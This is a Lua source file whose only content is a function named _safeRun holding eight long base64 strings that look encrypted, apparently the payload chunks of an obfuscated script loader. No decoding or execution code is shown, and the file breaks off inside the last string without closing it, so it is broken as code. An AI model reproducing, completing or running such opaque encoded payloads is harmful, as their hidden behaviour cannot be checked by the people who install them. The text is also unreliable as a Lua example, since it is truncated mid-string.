local _ifh = pcall
local _emd = nil
local _nvs = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "fUJVVndY9XTHtUuBBq/wej9kiV9ATZeWDvui+k6WmdyDqaouImKoRGoUaWIdqPUyAQpDBbtE/RRTaUGnQ4mFzeSPl7Mp6DZDHjL+7qwBsZpbOOx6nNeV+8B2K6FW42iSx8LmLC5SMIgNjYAjqP+W4u0ruRNETIylFu2LdqxD1U0IDlb5Xxp2ZZcwdHttIKoDUwZBB31uyyTxKXZdJAhNxEbNClw+KEHJ/McjjJKjZTDB139XtGm5k9YSyelwp5yqp7q4ZKSXL1rf1YjZtVrFSBHUKzua9CATMth7FtdcoNAnbbTex22v9CBxKtaRv9CHMOyRzgTflUsph51mXTHPkN9O76WRpRf0GE0U9I6/aYnl/Nt3bXvDj0HUyfT5SDCOEbVlkYg8JGPbnXW955u4oT9pdh3tNWZdf0vsIG90gycMQswt2ZW49Qd7JQGRam04fXpJAi+KaXyzH92PumtqSEJjo/YaqHbCY0eDuyfVzp1PRB6NVmCgl02CR3Z32qTNgzhFA+SbYGl1AyhMnxvtwYjvDxWSGVhqFmyARODbITvkXRlh3nzQSwZQEqzbWPxEIpYVqixHybL38nbJSdPU5HRPyds/ieX/SBmRmvrBylrvHcNcdlEGEbmdiI8SuxLUtScEZpN+feXAQ7HFG7cZincX5fokKQxsssMYPWcIBs0015njv1/DudWIwTgxM3XGbVtfu3aIPuMVq1CiTCxVHnmgHYWN7vh29eC3zO8LNm1SGBENwPGiycP+xPbWoC9FIhZO/Gz2kLX3MbjTfaYaKp/k7H9oCMS3A92IAStuv80SMLVZtd/hyHxrUhvlJ5W87D05jzVUQpMV/0LfmDuKp/VPMlaRjKR9PnMiDdazyWRtVJTmV1fL1kzFv98K3LELEJuIoyaNNBpYqLXc1m5L12pmS5BNxDhs6+RXJg/Hz6b/AaTH9JdaCVFPjCVO5iL1NesFhQCWUcvh5Gf4B0VBWQ2wTC44abdlveVPrcluZRi0TE3MyuFvztZmfsr+OCIQVMqEW7E6LBFH4k5p81yKhOYBAOQJSU0bYtB7weHX3vAxIwQ6vM4Vi0tDCjlnzh+Ot4sIhFNInbicX+ovmUa82BIuwLNIQKChSrLd9jTUaxjywX5V+AxSKRnWGP8VUu4Ixe3VzjTNAxTUYso06Vtmy97ZBpuZGVz03NBtBXh8ux6sKCqo6X4BgMmTIEDEtpnRNTOTIv6oaWExyTrcteA9l9AU8klqhziUv3rqqjLeKQBYPTO0USBx3ygd+11CIvOFH/CWLUmASzxx3Ch6Ap6tPvdb7VRfjeguT3wE26ZQy6+ITUsh99LdK9hF2rqdo/8nYWGPNhAyDkJNeXXWaCZDiRwGL1s/0UB8WdNqLRkhq+jCl1d3lx28n+7aiOC2U8kcU6auLDLHCeafT7FmGMUAzrxJRFCu2tObf1rkaQ5PswUB0BddwxrCEZwyPNcmHIKYkhCh92igVmVPHVudWi1qe8/BSMbO20wBTWbO/BB7qIdbFIgTNMsxwy+BJLQL5swwkxsuzdnNB/J3/0Azf8gf1z6c/6S9v7ObVyvE/ylzdFv3HDNlXnm+LtCRSJhp5TQc57DdxUjkNL67oH/y5bcYIiNfnt+m1QBzEdgLp6ad/Qr3zfKPEfqybOf5vFIeXo04x9MuyyYGNUWq5Ng5V1D9vSkq/8N1lxoR25+Tx4TaXv3V79fIg5TiBwDmReeMAESoU2vXbw0tuMrwbvtLT27AVxvg5kGJ5kfFjXM/F4yp3/pWEau85KI4v7roCR6cehir50omk4YaoLPnnndkyVZ4bh8g3CoxIZhVdQAyOcJE5iZMXOVbrqT3lg2ktYFZrPlfbre3Gq/ZIQVCN7NitZV4Yd8hCpKSrK+MmaTsr9BCRBTvdyxgoEnokBBCQZp5zuSeUtchh/4DmVNebxpCuOMZ6jU0N//q5Reh/JF1pBWkAUhXgYdsrUmuygHEmA5Gh0x0RYIIVbYwy6MlZ5ae"
  local _b4 = "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"
  local _b5 = "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"
  local _b6 = "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"
  local _b7 = "4EWj/95SjhHOJ713msyOE8tqsbmwJia8rXQtZKJG1UDXahWCVql8cdFfr3SjLeZVxwVBCZumZsri4zNrYQzZ1rQyrUWV7qyF8iE9UGhbyZSDIl/1YVapXwIY8NmNk/ArHMIQsRyP6uDmK3EM78m9hITiheUuHIF4AUaFiN++warQ92TSebhza8Sc+ZHWx3DZbgRUiol+G3GNIojiGQqZn2q2RQC2Ya4iqHPWjZiL0zXza7nZFYwg26ZRZUkG4ZG9s0ak4ZHlHa4a/3jg8S7xWbjQNRCxMAefQDoCmSQUewryiI+SPl27MXhUiDldRw69QoptXcnkx+q44aNUpN/e/2o+Y4U9dksvH/BI+39/coTY0ggfMx0mXKmC/m1+SSRGeW+kAUvl9tJvUhzWNyvo1ivm3u2xy8f3mM2eT+55UG9TbzyEA2oZvswPkWLPNYoD0+Kv5AjeNcmYbwU6rdMGF0U3w26H5I2sgbuYdBq+NmoNhRXJm/DHA0Bpr31d4ZReRl6A+sEgtDZrDONg057US3IWav/E+ja8Z7oMHPlJ8E41bomqEpuGXkwh3+694v91+x7Z89zmLh/otG0/hcnoNfCVYlS5Bd6UP2qJf7NhGOm1zyGSc+wzMgYWZcdzaj0MxCuO6S2bEZq5R7qhoCQnyFZp3z5Ry0IbcKRrAeNDzjQSs7BUB8B6Iuwy60MZVsrr0CQleDQIndXbrXApJoNYjyewAmxhbpZDy49erDawYZ2EvLKIwbKmzUJs1MViYZTbwNGLv2yIhpU1dA5YcPbaWAUFD2IWRCU3P+PSkM3iOAeeqd0kXiWDoEZsnlkxJ+JBQrLpDFGGa/W+WWKThumULotvaKqlBNdfHHdiWn2tDcuxi/tiYDtSbfUS3KP7fvGlUSIl/Aq/mRvUHu3zwfH+9vdJqUr9BpXSFlVuWeBfEyBR3Gbgwmm/RYOr/6btAKbJ7v2Uhzzvv3I7k8OMZXUMTOWrIK8S990VDcVaggjQFJo/1V6i1IcmJvc09eQlVEWhZzgIMthUmALcmVqrzIv08hijyxsslc0yLZ2Xpdc3Bkmq2qbxD/8c4Xop+snJ1HpTo04MOIXjOvu0B7Fe/jRvAU+DX114U+1L3ocB0P+V/Jug3m+jGtXdfZ92l+nveW1apsjzhkRouWzteZMKFyfFdGVMs/H0UkZXYudAsxk8ye/o9tEjj/5rjZqrVojraBe4oZ+R2x8dl9PKIZjcxL/o8Ak/NtLivTa2c9UV3yhqynrHNJXowNTlf3lvFR6edLamTaf2RBWONH9QmeO7QOdzhF3GlKhGZYwbPevnkCooVHv18FVc80rmBWXBbC9KlcDm74heySkMOXsteGn0dfq1F2Wt0kE6rO7/5i1fK1Ljn9x4yY+wT/odubVaFLjN7Znx+LuqO8KQHMPH+E4+Ov0JaarXK6SpaiTqansLt7dwmVqvopHEqthjFuJOE5F39vSxvzNll/uuNfkRvEQ5YGmkbwC7EyXb2Z9Q7oLQteB+UH3HvbQO5NBsvzrriEg98ZdpdPwlyHXJ2jBDbUII9u5C5FtwJsgyjcPLasrSwMqERdV7V1Ie5/lM4mWfjljEfrT2BMmbK8y9gWoxfPc1gJNGzKHJ24XC9lyWWC